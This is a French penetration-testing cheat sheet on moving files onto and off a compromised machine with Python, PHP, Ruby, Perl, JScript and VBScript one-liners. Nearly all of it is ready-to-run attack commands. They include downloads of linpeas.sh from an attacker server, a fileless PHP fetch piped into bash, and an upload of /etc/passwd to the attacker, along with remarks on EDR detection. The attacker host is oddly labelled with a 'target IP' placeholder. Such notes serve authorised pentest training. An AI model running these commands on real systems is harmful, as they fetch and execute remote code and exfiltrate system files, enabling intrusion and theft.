# Transferts de fichiers via du code

## Pourquoi

Les outils classiques de transfert (wget, curl, PowerShell) ne sont pas toujours disponibles sur une cible. En revanche, il est frequent de trouver un ou plusieurs langages de programmation installes : Python, PHP, Ruby ou Perl sur Linux, voire JavaScript et VBScript sur Windows. Savoir ecrire un one-liner de telechargement dans plusieurs langages elargit considerablement les possibilites en situation contrainte.

## Comment ca marche

Chaque langage offre des bibliotheques reseau permettant d'effectuer des requetes HTTP. L'idee est simple : ouvrir une connexion vers le serveur d'attaque, recuperer le contenu d'un fichier, et l'ecrire localement. Certains langages permettent aussi l'execution directe en memoire (pipe vers un interpreteur).

## En pratique

### Python

Python est present sur la quasi-totalite des systemes Linux, et parfois sur Windows.

{% tabs %}
{% tab title="Python 3" %}
```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<IP_CIBLE>:8080/linpeas.sh", "linpeas.sh")'
```
{% endtab %}
{% tab title="Python 2" %}
```bash
python2.7 -c 'import urllib; urllib.urlretrieve("http://<IP_CIBLE>:8080/linpeas.sh", "linpeas.sh")'
```
{% endtab %}
{% endtabs %}

### PHP

PHP est present sur la majorite des serveurs web. Plusieurs fonctions permettent de telecharger un fichier.

**Methode file_get_contents + file_put_contents :**

```bash
php -r '$f = file_get_contents("http://<IP_CIBLE>:8080/linpeas.sh"); file_put_contents("linpeas.sh", $f);'
```

**Methode fopen (lecture par blocs) :**

```bash
php -r 'const B=1024; $r=fopen("http://<IP_CIBLE>:8080/linpeas.sh","rb"); $l=fopen("linpeas.sh","wb"); while($b=fread($r,B)){fwrite($l,$b);} fclose($l); fclose($r);'
```

**Execution fileless :**

```bash
php -r '$lines = @file("http://<IP_CIBLE>:8080/linpeas.sh"); foreach ($lines as $l) { echo $l; }' | bash
```

### Ruby

```bash
ruby -e 'require "net/http"; File.write("linpeas.sh", Net::HTTP.get(URI.parse("http://<IP_CIBLE>:8080/linpeas.sh")))'
```

### Perl

```bash
perl -e 'use LWP::Simple; getstore("http://<IP_CIBLE>:8080/linpeas.sh", "linpeas.sh");'
```

### JavaScript (Windows, via cscript.exe)

Sur Windows, `cscript.exe` permet d'executer du JavaScript. On peut creer un fichier `wget.js` :

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

**Execution :**

```cmd
cscript.exe /nologo wget.js http://<IP_CIBLE>:8080/outil.exe outil.exe
```

### VBScript (Windows)

Alternative a JavaScript, VBScript fonctionne de la meme facon avec `cscript.exe`.

Fichier `wget.vbs` :

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

**Execution :**

```cmd
cscript.exe /nologo wget.vbs http://<IP_CIBLE>:8080/outil.exe outil.exe
```

### Upload avec Python

**Cote attaquant :**

```bash
python3 -m uploadserver 8080
```

**Cote cible :**

```bash
python3 -c 'import requests; requests.post("http://<IP_CIBLE>:8080/upload", files={"files": open("/etc/passwd","rb")})'
```

## Pieges et galeres

- Python 2 est encore present sur des systemes anciens, mais la syntaxe `urllib` differe entre les versions 2 et 3. Toujours verifier la version disponible avec `python --version`.
- PHP en ligne de commande (`php -r`) n'est pas disponible si seul le module Apache est installe. Verifier avec `which php`.
- `LWP::Simple` (Perl) n'est pas toujours installe. Alternative : `IO::Socket` pour un transfert plus bas niveau.
- Les scripts JavaScript/VBScript sur Windows sont souvent surveilles par l'EDR. Ce ne sont pas les methodes les plus discretes.

## Retour terrain

En mission, Python 3 est le langage le plus fiable pour les transferts alternatifs. Il est presque toujours disponible sur Linux, et son one-liner de telechargement est facile a memoriser. Sur Windows, quand PowerShell est bloque, `cscript.exe` avec un petit fichier JS ou VBS peut debloquer la situation.

## Memo express

| Langage | Commande rapide |
|---|---|
| Python 3 | `python3 -c 'import urllib.request; urllib.request.urlretrieve("URL", "fichier")'` |
| PHP | `php -r 'file_put_contents("f", file_get_contents("URL"));'` |
| Ruby | `ruby -e 'require "net/http"; File.write("f", Net::HTTP.get(URI.parse("URL")))'` |
| Perl | `perl -e 'use LWP::Simple; getstore("URL", "f");'` |
| JS (Windows) | `cscript.exe /nologo wget.js URL fichier` |
| VBS (Windows) | `cscript.exe /nologo wget.vbs URL fichier` |

***
